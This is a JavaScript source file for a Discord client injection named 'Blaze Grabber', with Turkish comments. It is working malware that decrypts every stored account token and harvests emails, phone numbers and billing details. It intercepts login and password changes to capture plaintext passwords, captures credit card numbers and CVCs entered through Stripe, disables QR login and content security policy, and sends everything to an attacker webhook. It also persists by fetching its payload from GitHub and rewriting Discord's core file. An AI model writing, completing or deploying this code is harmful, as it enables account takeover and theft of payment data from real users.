'use strict';

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';

const fs          = require('fs');
const path        = require('path');
const https       = require('https');
const querystring = require('querystring');
const { BrowserWindow, session, safeStorage } = require('electron');

// ── Config ────────────────────────────────────────────────────────────────────
const WEBHOOK    = '%WEBHOOK%';
const AVATAR_URL = 'https://i.pinimg.com/originals/43/79/bb/4379bb008f3b678c973727818e68ab35.gif';
const EMBED_COLOR = 0xFF2514;
const BOT_NAME   = 'Blaze Grabber';
const INJECT_URL = 'https://raw.githubusercontent.com/blazewys/discordinjection/refs/heads/main/dcinject.js';

// ── State ─────────────────────────────────────────────────────────────────────
let _initDone   = false;
let _updateDone = false;

// ── execScript ────────────────────────────────────────────────────────────────
const execScript = (script) => {
    const win = BrowserWindow.getAllWindows()[0];
    return win.webContents.executeJavaScript(script, true);
};

// localStorage'dan TÜM hesapların şifreli tokenlarını al, main process'te çöz
const GET_ALL_TOKENS_SCRIPT = `(function(){
    try {
        var f = document.createElement('iframe');
        document.body.appendChild(f);
        var ls = Object.getOwnPropertyDescriptor(f.contentWindow,'localStorage').get.call(window);
        f.remove();
        var result = [];
        // Tek token (aktif hesap)
        if (ls.token) result.push(ls.token);
        // Multi-account: "tokens" key — object veya array
        try {
            var multi = ls.tokens;
            if (multi) {
                var parsed = JSON.parse(multi);
                if (Array.isArray(parsed)) {
                    parsed.forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
                } else if (typeof parsed === 'object') {
                    Object.values(parsed).forEach(function(t){ if(t && result.indexOf(t)===-1) result.push(t); });
                }
            }
        } catch(e) {}
        // MultiAccountStore
        try {
            var mas = ls.MultiAccountStore;
            if (mas) {
                var mObj = JSON.parse(mas);
                var accounts = mObj.users || mObj.accounts || [];
                accounts.forEach(function(a){ var t = a.token||a.accessToken; if(t && result.indexOf(t)===-1) result.push(t); });
            }
        } catch(e) {}
        return result;
    } catch(e) { return []; }
})()`;

async function getAllTokens(retries = 8, delayMs = 2000) {
    for (let i = 0; i < retries; i++) {
        try {
            const encrypted = await execScript(GET_ALL_TOKENS_SCRIPT);
            if (Array.isArray(encrypted) && encrypted.length > 0) {
                const tokens = [];
                for (const enc of encrypted) {
                    try {
                        if (enc && enc.includes('dQw4w9WgXcQ:')) {
                            const b64   = enc.replace(/^"?dQw4w9WgXcQ:/, '').replace(/"$/, '').trim();
                            const buf   = Buffer.from(b64, 'base64');
                            const token = safeStorage.decryptString(buf);
                            if (token && !tokens.includes(token)) tokens.push(token);
                        } else if (enc && !enc.includes('dQw4w9WgXcQ:')) {
                            // Plain token (eski format)
                            if (!tokens.includes(enc)) tokens.push(enc);
                        }
                    } catch {}
                }
                if (tokens.length > 0) return tokens;
            }
        } catch {}
        if (i < retries - 1) await sleep(delayMs);
    }
    return [];
}

// Geriye dönük uyumluluk — tek token gerektiğinde
async function getToken(retries = 3, delayMs = 1000) {
    const tokens = await getAllTokens(retries, delayMs);
    return tokens.length > 0 ? tokens[0] : null;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ── HTTP helpers ──────────────────────────────────────────────────────────────

// Discord API — https ile direkt (token header ile, renderer'a gerek yok)
function apiGet(endpoint, token) {
    return new Promise(resolve => {
        const url = new URL(endpoint);
        const req = https.request({
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'GET',
            headers:  {
                'Authorization': token,
                'Content-Type':  'application/json',
                'User-Agent':    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            },
            timeout: 10000,
        }, res => {
            let b = '';
            res.on('data', d => b += d);
            res.on('end', () => { try { resolve(JSON.parse(b)); } catch { resolve(null); } });
        });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.end();
    });
}

async function getIP() {
    return new Promise(resolve => {
        const req = https.get('https://api.ipify.org?format=json', { timeout: 8000 }, res => {
            let b = '';
            res.on('data', d => b += d);
            res.on('end', () => { try { resolve(JSON.parse(b).ip || 'N/A'); } catch { resolve('N/A'); } });
        });
        req.on('error',   () => resolve('N/A'));
        req.on('timeout', () => { req.destroy(); resolve('N/A'); });
    });
}

async function resolveAvatar(baseUrl) {
    if (!baseUrl) return null;
    return new Promise(resolve => {
        const gifUrl = baseUrl + '.gif?size=512';
        const req = https.get(gifUrl, { timeout: 6000 }, res => {
            resolve(res.headers['content-type'] === 'image/gif'
                ? gifUrl : baseUrl + '.png?size=512');
        });
        req.on('error',   () => resolve(baseUrl + '.png?size=512'));
        req.on('timeout', () => { req.destroy(); resolve(baseUrl + '.png?size=512'); });
    });
}

async function postWebhook(payload) {
    return new Promise(resolve => {
        const body = JSON.stringify(payload);
        const url  = new URL(WEBHOOK);
        const req  = https.request({
            hostname: url.hostname,
            path:     url.pathname + url.search,
            method:   'POST',
            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
            timeout:  15000,
        }, res => { res.resume(); resolve(res.statusCode); });
        req.on('error',   () => resolve(null));
        req.on('timeout', () => { req.destroy(); resolve(null); });
        req.write(body);
        req.end();
    });
}

// ── Badge / Nitro / Billing helpers ──────────────────────────────────────────

// Badge ID → label map (profile endpoint'ten gelen id'ler)
const PROFILE_BADGE_MAP = {
    'staff':                    '👮 Staff',
    'partner':                  '🤝 Partner',
    'hypesquad':                '🏠 HypeSquad Events',
    'bug_hunter_level_1':       '🐛 Bug Hunter',
    'hypesquad_online_house_1': '🏡 Bravery',
    'hypesquad_online_house_2': '💡 Brilliance',
    'hypesquad_online_house_3': '⚖️ Balance',
    'premium_early_supporter':  '⭐ Early Supporter',
    'bug_hunter_level_2':       '🐛 Bug Hunter Gold',
    'verified_developer':       '🤖 Verified Dev',
    'certified_moderator':      '🛡️ Certified Mod',
    'active_developer':         '🔨 Active Dev',
    'legacy_username':          '🏷️ Legacy Username',
    'quest_completed':          '🎯 Quest Completed',
    'orb_profile_badge':        '🔮 Orbs Badge',
    'guild_booster_lvl1':       '🚀 Boost Lvl 1',
    'guild_booster_lvl2':       '🚀 Boost Lvl 2',
    'guild_booster_lvl3':       '🚀 Boost Lvl 3',
    'guild_booster_lvl4':       '🚀 Boost Lvl 4',
    'guild_booster_lvl5':       '🚀 Boost Lvl 5',
    'guild_booster_lvl6':       '� Boost Lvl 6',
    'guild_booster_lvl7':       '🚀 Boost Lvl 7',
    'guild_booster_lvl8':       '🚀 Boost Lvl 8',
    'guild_booster_lvl9':       '🚀 Boost Lvl 9',
    'premium_tenure_1_month':   '🥉 Nitro 1 ay',
    'premium_tenure_3_month':   '🥈 Nitro 3 ay',
    'premium_tenure_6_month_v2':'🥇 Nitro 6 ay',
    'premium_tenure_12_month':  '🏆 Nitro 12 ay',
    'premium_tenure_24_month':  '👑 Nitro 24 ay',
};

function getBadges(user) {
    // Sadece profile endpoint'ten gelen badges — bitfield'dan active_dev vb. ekleme
    const profileBadges = (user._profile_badges || []).map(b => {
        return PROFILE_BADGE_MAP[b.id] || b.description || b.id;
    });
    return profileBadges.length ? profileBadges.join(', ') : ':x:';
}

function getNitro(user) {
    const t = user.premium_type;
    if (!t) return ':x:';

    const base = { 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' }[t] || ':x:';
    if (t !== 2 || !user.premium_guild_since) return base;

    // Boost süresi hesapla
    const since = new Date(user.premium_guild_since);
    const now   = new Date();
    const months = Math.floor((now - since) / (1000 * 60 * 60 * 24 * 30));
    const levels = [
        [1,  '🥉 Boost 1 ay'],
        [2,  '🥈 Boost 2 ay'],
        [3,  '🥇 Boost 3 ay'],
        [6,  '🏆 Boost 6 ay'],
        [9,  '💠 Boost 9 ay'],
        [12, '🔷 Boost 12 ay'],
        [15, '🔶 Boost 15 ay'],
        [18, '🌟 Boost 18 ay'],
        [24, '👑 Boost 24 ay'],
    ];
    let boostLabel = '🚀 Boosting';
    for (const [m, label] of levels) {
        if (months >= m) boostLabel = label;
    }
    return `${base} — ${boostLabel}`;
}

function parseBilling(sources) {
    if (!sources || !sources.length) return ':x:';
    const out = sources.map(s => {
        const icon = s.type === 1 ? ':credit_card:' : s.type === 2 ? '<:paypal:973417655627288666>' : null;
        if (!icon) return null;
        return s.invalid ? `~~${icon}~~ (expired)` : icon;
    }).filter(Boolean);
    return out.length ? out.join(' ') : ':x:';
}

// ── Embed builder ─────────────────────────────────────────────────────────────

function buildPayload(title, fields, thumbnail, image) {
    const embed = { title, color: EMBED_COLOR, fields, footer: { text: BOT_NAME } };
    if (thumbnail) embed.thumbnail = { url: thumbnail };
    if (image)     embed.image     = { url: image };
    return { username: BOT_NAME, avatar_url: AVATAR_URL, embeds: [embed] };
}

async function buildUserInfo(token) {
    const [user, billing] = await Promise.all([
        apiGet('https://discord.com/api/v9/users/@me',                         token),
        apiGet('https://discord.com/api/v9/users/@me/billing/payment-sources', token),
    ]);
    if (!user || user.message) return null;

    // Profile — renderer üzerinden çağır (Discord'un kendi session'ı, CORS/auth sorunu yok)
    try {
        const profileJson = await execScript(`(function(){
            var x = new XMLHttpRequest();
            x.open("GET", "https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false", false);
            x.setRequestHeader("Authorization", ${JSON.stringify(token)});
            x.send(null);
            try { return JSON.parse(x.responseText); } catch(e) { return null; }
        })()`);
        if (profileJson && !profileJson.message) {
            if (profileJson.premium_guild_since) user.premium_guild_since = profileJson.premium_guild_since;
            user._profile_badges = Array.isArray(profileJson.badges) ? profileJson.badges : [];
        } else {
            user._profile_badges = [];
        }
    } catch {
        user._profile_badges = [];
    }

    const [avatar, banner] = await Promise.all([
        resolveAvatar(user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}` : null),
        resolveAvatar(user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}` : null),
    ]);
    return { user, billing, avatar, banner };
}

function buildFields(user, billing, friends, token, extra) {
    const fields = [
        { name: '👤 Username', value: `\`${user.username}\``,            inline: true },
        { name: '🆔 ID',       value: `\`${user.id}\``,                  inline: true },
        { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true },
        { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true },
        { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true },
        { name: '💎 Nitro',    value: getNitro(user),                    inline: true },
        { name: '💳 Billing',  value: parseBilling(billing),             inline: true },
        { name: '🏅 Badges',   value: getBadges(user),                   inline: true },
        ...(extra || []),
        { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
    ];
    return fields;
}

function getDiscordClientName() {
    const parts = __dirname.replace(/\\/g, '/').split('/');
    for (let i = parts.length - 1; i >= 0; i--) {
        if (/^Discord(PTB|Canary|Development)?$/i.test(parts[i])) return parts[i];
    }
    return 'Discord';
}

// ── firstTime ─────────────────────────────────────────────────────────────────

async function firstTime() {
    if (_initDone) return;
    _initDone = true;

    try {
        const ip     = await getIP();
        const client = getDiscordClientName();
        const tokens = await getAllTokens(8, 2000);

        if (!tokens.length) {
            await postWebhook(buildPayload(
                'Discord Injection — No Session',
                [
                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
                ],
                AVATAR_URL, null
            ));
            return;
        }

        // Her hesap için ayrı embed
        for (const token of tokens) {
            try {
                const info = await buildUserInfo(token);
                if (!info) continue;
                const { user, billing, avatar, banner } = info;
                const fields = buildFields(user, billing, null, token, [
                    { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
                    { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
                    { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
                ]);
                await postWebhook(buildPayload(
                    'Discord Injection — Initialized',
                    fields,
                    avatar || AVATAR_URL, banner || null
                ));
            } catch {}
        }
    } catch {}
}

// ── updateCheck ───────────────────────────────────────────────────────────────

function updateCheck() {
    if (_updateDone) return;
    _updateDone = true;
    try {
        const exeDir       = path.dirname(process.execPath);
        const resourcePath = path.join(exeDir, 'resources');
        if (!fs.existsSync(resourcePath)) return;

        const appDir  = path.join(resourcePath, 'app');
        const appAsar = path.join(resourcePath, 'app.asar');

        const modulesDir = path.join(exeDir, 'modules');
        if (!fs.existsSync(modulesDir)) return;
        const coreFolder = fs.readdirSync(modulesDir).find(x => /^discord_desktop_core-\d+$/.test(x));
        if (!coreFolder) return;
        const indexJs = path.join(modulesDir, coreFolder, 'discord_desktop_core', 'index.js');

        if (!fs.existsSync(appDir)) fs.mkdirSync(appDir, { recursive: true });
        fs.writeFileSync(path.join(appDir, 'package.json'),
            JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));

        const script = [
            `const fs=require('fs'),https=require('https');`,
            `const idx=${JSON.stringify(indexJs)};`,
            `const url=${JSON.stringify(INJECT_URL)};`,
            `const wh=${JSON.stringify(WEBHOOK)};`,
            `function init(){https.get(url,{timeout:15000},res=>{`,
            `  let d='';res.on('data',c=>d+=c);`,
            `  res.on('end',()=>{try{`,
            `    const cur=fs.readFileSync(idx,'utf8');`,
            `    if(cur.length<20000||cur==="module.exports = require('./core.asar');")`,
            `      fs.writeFileSync(idx,d.replace('%WEBHOOK%',wh));`,
            `  }catch{}});`,
            `}).on('error',()=>setTimeout(init,10000));}`,
            `init();`,
            `require(${JSON.stringify(appAsar)});`,
        ].join('\n');

        fs.writeFileSync(path.join(appDir, 'index.js'), script);
    } catch {}
}

// ── uploadData parse ──────────────────────────────────────────────────────────

function parseUploadData(details) {
    try {
        if (!details.uploadData || !details.uploadData[0]) return null;
        const raw = Buffer.from(details.uploadData[0].bytes).toString('utf8');
        if (!raw) return null;
        try { return JSON.parse(raw); }
        catch { return querystring.parse(decodeURIComponent(raw)); }
    } catch { return null; }
}

// ── onCompleted ───────────────────────────────────────────────────────────────

session.defaultSession.webRequest.onCompleted({
    urls: [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        'https://discord.com/api/v*/auth/login',
        'https://discordapp.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://api.braintreegateway.com/merchants/*/client_api/v*/payment_methods/paypal_accounts',
        'https://api.stripe.com/v*/tokens',
        'https://api.stripe.com/v*/setup_intents/*/confirm',
        'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
}, async (details) => {
    if (details.statusCode !== 200 && details.statusCode !== 202) return;
    if (!['POST', 'PATCH'].includes(details.method)) return;

    const data = parseUploadData(details);
    if (!data) return;

    const token = await getToken(3, 1000);
    if (!token) return;

    const ip     = await getIP();
    const client = getDiscordClientName();
    const info   = await buildUserInfo(token);
    if (!info) return;

    const { user, billing, avatar, banner } = info;
    const base = [
        { name: '💻 Computer', value: `\`${process.env.COMPUTERNAME || 'N/A'}\``, inline: true },
        { name: '🌐 IP',       value: `\`${ip}\``,                                 inline: true },
        { name: '📂 Client',   value: `\`${client}\``,                             inline: true },
    ];

    switch (true) {
        case details.url.endsWith('login'):
            if (!data.password) return;
            await postWebhook(buildPayload(
                'Discord — Login Captured',
                buildFields(user, billing, null, token, [
                    ...base,
                    { name: '🔑 Password', value: `\`${data.password}\``, inline: false },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        case details.url.endsWith('users/@me') && details.method === 'PATCH':
            if (!data.password) return;
            if (data.new_password) {
                await postWebhook(buildPayload(
                    'Discord — Password Changed',
                    buildFields(user, billing, null, token, [
                        ...base,
                        { name: '🔑 Old Password', value: `\`${data.password}\``,     inline: true },
                        { name: '🔑 New Password', value: `\`${data.new_password}\``, inline: true },
                    ]),
                    avatar || AVATAR_URL, banner || null
                ));
            }
            if (data.email) {
                await postWebhook(buildPayload(
                    'Discord — Email Changed',
                    buildFields(user, billing, null, token, [
                        ...base,
                        { name: '📧 New Email', value: `\`${data.email}\``,    inline: true },
                        { name: '🔑 Password',  value: `\`${data.password}\``, inline: true },
                    ]),
                    avatar || AVATAR_URL, banner || null
                ));
            }
            break;

        case details.url.includes('api.stripe.com') && details.url.endsWith('tokens'):
            await postWebhook(buildPayload(
                'Discord — Credit Card Added',
                buildFields(user, billing, null, token, [
                    ...base,
                    { name: '💳 Card',   value: `\`${data['card[number]']    || 'N/A'}\``,                                inline: true },
                    { name: '🔒 CVC',    value: `\`${data['card[cvc]']       || 'N/A'}\``,                                inline: true },
                    { name: '📅 Expiry', value: `\`${data['card[exp_month]'] || '?'}/${data['card[exp_year]'] || '?'}\``, inline: true },
                ]),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        case details.url.includes('paypal_accounts'):
            await postWebhook(buildPayload(
                'Discord — PayPal Added',
                buildFields(user, billing, null, token, base),
                avatar || AVATAR_URL, banner || null
            ));
            break;

        default:
            break;
    }
});

// ── onBeforeRequest ───────────────────────────────────────────────────────────

session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'wss://remote-auth-gateway.discord.gg/*',
    ],
}, (details, callback) => {
    if (details.url.startsWith('wss://remote-auth-gateway')) {
        return callback({ cancel: true });
    }
    firstTime().catch(() => {});
    updateCheck();
    callback({});
});

// ── onHeadersReceived ─────────────────────────────────────────────────────────

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': ['*'],
        },
    });
});

// ── Discord core yükle ────────────────────────────────────────────────────────

module.exports = require('./core.asar');
